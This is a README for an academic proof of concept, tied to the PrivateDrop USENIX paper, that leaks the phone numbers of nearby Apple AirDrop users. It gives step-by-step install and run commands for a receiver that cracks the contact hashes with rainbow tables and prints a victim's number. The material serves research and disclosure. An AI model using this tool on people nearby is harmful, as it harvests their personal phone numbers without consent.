# PoC: AirDrop Phone Number Leak

This PoCs demonstrates the contact identifier leakage in Apple AirDrop that was described in

* Alexander Heinrich, Matthias Hollick, Thomas Schneider, Milan Stute, and Christian Weinert. **PrivateDrop: Practical Privacy-Preserving Authentication for Apple AirDrop** in _30th USENIX Security Symposium_. [Website](https://privatedrop.github.io). [Preprint](https://www.usenix.org/system/files/sec21fall-heinrich.pdf).

**Note:** We configured the used rainbow table to only work with German mobile phone numbers (prefix: +49). Other tables, e.g., containing all international phone numbers, can be generated with [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers)'s `rtgen`.

## Installation

Run the following instructions on a Mac (tested with macOS 11.3.2).

1. Checkout the repository.

```bash
git clone https://github.com/seemoo-lab/opendrop.git
cd opendrop
git checkout poc-phonenumber-leak
git submodules update --init
```

2. Install Python dependencies.

```bash
pip3 install -r requirements.txt
```

3. Build [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers).

```bash
brew install libomp
cd rt_phone_numbers
make -f Makefile.macOS
cd ..
```

## Usage

Simply run the following and wait for someone in proximity to open the AirDrop sharing menu.

```bash
python3 -m opendrop receive
```

An example output would look like this:

```
Announcing service: host opendrop, address fe80::c8b9:fbff:fee9:d544, port 8771
Starting HTTPS server
Nearby phone number: +49<...>
```
